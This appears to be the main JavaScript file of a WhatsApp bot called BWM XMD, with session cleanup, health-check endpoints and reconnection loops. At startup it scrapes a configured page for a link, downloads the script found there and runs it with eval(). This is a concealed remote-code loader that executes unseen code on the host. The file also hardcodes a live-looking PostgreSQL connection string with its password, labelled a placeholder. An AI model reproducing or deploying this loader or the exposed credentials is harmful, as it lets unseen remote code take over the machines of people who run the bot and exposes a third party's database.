//=====================//
//     Bwm xmd         //
//  Sir Ibrahim Adams  //
//=====================//

const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { Pool } = require('pg'); // Added for PostgreSQL interaction
const { initializeDatabase } = require('./Ibrahim/api/db'); // Assuming this file will contain DB setup

// Function to clear session data
function clearSessionData() {
  const sessionDir = path.join(__dirname, 'Session');

  if (fs.existsSync(sessionDir)) {
    const files = fs.readdirSync(sessionDir);

    for (const file of files) {
      if (file !== 'creds.json') { // Preserve credentials file
        const filePath = path.join(sessionDir, file);
        try {
          fs.unlinkSync(filePath);
          console.log(`Cleared session file: ${file}`);
        } catch (err) {
          console.error(`Error clearing file ${file}:`, err);
        }
      }
    }
    console.log('Session data cleared successfully');
  }
}

// Clear session data before starting
clearSessionData();
const cheerio = require('cheerio');
require('events').EventEmitter.defaultMaxListeners = 25;
const adams = require(__dirname + "/config");

// Configure port for scale-to-zero support
const PORT = process.env.PORT || 5000;
const HOST = '0.0.0.0';
const http = require('http');
const express = require('express');
const app = express();

// Single instance optimization
const COMMAND_TIMEOUT = 30000; // 30 seconds max command execution time
let activeCommands = new Map();

// Command handler optimization
async function handleCommand(command, timeout = COMMAND_TIMEOUT) {
  const commandId = Date.now().toString();

  try {
    // Clear old commands
    for (let [id, cmd] of activeCommands) {
      if (Date.now() - parseInt(id) > timeout) {
        activeCommands.delete(id);
      }
    }

    // Add new command
    activeCommands.set(commandId, command);

    // Prioritize newer commands
    if (activeCommands.size > 10) { // Keep max 10 active commands
      const oldestCmd = activeCommands.keys().next().value;
      activeCommands.delete(oldestCmd);
    }

    console.log(`Processing command: ${command}`);
    return true;
  } catch (error) {
    console.error('Command handling failed:', error);
    return false;
  }
}


// Health check endpoints for scale-to-zero
app.get('/', (req, res) => {
  res.status(200).send('BWM XMD Bot Status: Online');
});

app.get('/health', (req, res) => {
  const status = {
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    bot: global.xmd && global.xmd.user ? 'connected' : 'disconnecting'
  };
  res.status(200).json(status);
});

// Ready check for scale-to-zero
app.get('/ready', (req, res) => {
  if (global.xmd && global.xmd.user) {
    res.status(200).json({ ready: true });
  } else {
    res.status(503).json({ ready: false });
  }
});
const server = http.createServer(app);
server.listen(PORT, '0.0.0.0', () => {
  console.log(`BWM XMD Bot Server running on port ${PORT}`);
});

// Implement connection coordination
const REPLICA_LOCK_TIMEOUT = 60000; // 1 minute
let isActivePrimary = false;
let lastPingTime = 0;

// Keep-alive ping with replica coordination
setInterval(async () => {
  try {
    if (global.xmd && global.xmd.user) {
      const currentTime = Date.now();

      // Only one replica should be active at a time
      if (!isActivePrimary && currentTime - lastPingTime > REPLICA_LOCK_TIMEOUT) {
        isActivePrimary = true;
        console.log("Taking over as primary replica");
      }

      if (isActivePrimary) {
        console.log("Primary replica active");
        lastPingTime = currentTime;
      } else {
        console.log("Secondary replica standing by");
      }
    }
  } catch (error) {
    console.error("Ping error:", error);
  }
}, 45000);

// Health check endpoint includes replica status
app.get('/health', (req, res) => {
  const status = {
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    isPrimary: isActivePrimary,
    bot: global.xmd && global.xmd.user ? 'connected' : 'disconnecting'
  };
  res.status(200).json(status);
});

async function fetchAdamsUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const adamsUrlElement = $('a:contains("ADAM_URL")'); 
    const adamsUrl = adamsUrlElement.attr('href');

    if (!adamsUrl) {
      throw new Error('The URL link not found...');
    }

    console.log('You have successfully connected to the server ✅');

    const scriptResponse = await axios.get(adamsUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Fatal Error:', {
      message: error.message,
      stack: error.stack,
      timestamp: new Date().toISOString(),
      type: error.name,
      code: error.code || 'UNKNOWN'
    });

    // Attempt to recover or gracefully shutdown
    if (error.code === 'MODULE_NOT_FOUND') {
      console.error('Missing required module. Please check your dependencies.');
    } else if (error.code === 'ECONNREFUSED') {
      console.error('Connection refused. Please check your network connection.');
    }
  }
}

// Placeholder for database connection details (replace with your actual credentials)
const SM_DB = 'postgresql://postgres:zuzeIwLmEisQPsUkLmbBLkYxYXhIOLiT@crossover.proxy.rlwy.net:16749/railway';
const pool = new Pool({ connectionString: SM_DB });


// Database initialization moved to Ibrahim/api/db.js


async function startBwm() {
  try {
    // Add delay between replica starts to prevent connection conflicts
    const replicaDelay = Math.random() * 5000; // Random delay up to 5 seconds
    await new Promise(resolve => setTimeout(resolve, replicaDelay));

    const { initializeDatabase } = require('./Ibrahim/api/db');
    await initializeDatabase();

    // Implement connection retry with backoff
    let retries = 0;
    const maxRetries = 3;

    while (retries < maxRetries) {
      try {
        await fetchAdamsUrl();
        break;
      } catch (error) {
        retries++;
        console.log(`Connection attempt ${retries} failed, retrying in ${retries * 2} seconds...`);
        await new Promise(resolve => setTimeout(resolve, retries * 2000));
      }
    }
  } catch (error) {
    console.error('Fatal startup error:', error);
    process.exit(1);
  }
}

// Enhanced persistent owner connection management
let isOwnerConnection = false;
let reconnectAttempts = 0;
const maxReconnectAttempts = Infinity; // Never stop trying to reconnect owner
const reconnectDelay = 15000; // 15 second reconnect delay
const ownerKeepAliveInterval = 10000; // 10 second keepalive for owner
const ownerReconnectBackoff = 1.5; // Exponential backoff multiplier
let currentReconnectDelay = reconnectDelay;

// Verify if the current connection is owner
const checkOwnerConnection = () => {
  return global.xmd && global.xmd.user && global.xmd.user.id.startsWith(process.env.NUMERO_OWNER);
};

// Persistent owner connection management
const keepOwnerAlive = setInterval(async () => {
  try {
    if (isOwnerConnection && global.xmd?.user) {
      console.log("Owner connection active");
      await global.xmd.sendPresenceUpdate('available');
      currentReconnectDelay = reconnectDelay; // Reset delay on successful ping
      reconnectAttempts = 0;
    } else if (checkOwnerConnection()) {
      console.log("Attempting to restore owner connection...");
      try {
        await global.xmd.connect();
        isOwnerConnection = true;
        console.log("Owner connection restored successfully");
      } catch (error) {
        console.error("Reconnection failed:", error);
        currentReconnectDelay *= ownerReconnectBackoff;
        setTimeout(keepOwnerAlive, currentReconnectDelay);
      }
    }
  } catch (error) {
    console.error("Connection maintenance error:", error);
  }
}, ownerKeepAliveInterval);

// Prevent connection termination
global.xmd?.ev.on('connection.update', async (update) => {
  const { connection, lastDisconnect } = update;
  if (connection === 'close' && isOwnerConnection) {
    console.log("Owner connection closed, attempting immediate reconnect");
    try {
      await global.xmd.connect();
      console.log("Owner connection restored");
    } catch (error) {
      console.error("Immediate reconnection failed:", error);
    }
  }
});

// Keep-alive ping with connection management
setInterval(async () => {
  try {
    if (global.xmd && global.xmd.user) {
      isOwnerConnection = checkOwnerConnection();

      if (isOwnerConnection) {
        console.log("Owner connection active and stable");
        reconnectAttempts = 0; // Reset attempts when owner is connected
      } else {
        console.log("Non-owner connection active");
      }
    } else if (isOwnerConnection) {
      // Only attempt reconnect for owner connection
      if (reconnectAttempts < maxReconnectAttempts) {
        console.log("Attempting to restore owner connection...");
        reconnectAttempts++;
        // Implementation specific reconnect logic here
      }
    }
  } catch (error) {
    console.error("Connection check error:", error);
  }
}, 45000);

// Connection status monitor
setInterval(() => {
  if (global.xmd && global.xmd.user) {
    const status = isOwnerConnection ? "Owner" : "Secondary";
    console.log(`${status} connection health check: Active`);
  }
}, 300000);

startBwm();